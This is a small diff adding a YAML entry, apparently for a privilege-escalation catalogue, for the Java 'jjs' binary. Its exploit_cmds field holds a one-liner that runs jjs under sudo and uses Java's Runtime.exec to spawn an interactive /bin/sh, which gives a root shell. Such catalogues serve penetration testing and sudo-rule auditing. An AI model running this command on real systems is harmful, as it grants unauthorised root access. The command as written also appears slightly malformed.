@@ -1,0 +1,5 @@
+name: jjs
+binary_path: /usr/bin/jjs
+exploit_cmds:
+- sudo /usr/bin/jjs && Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c
+  $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
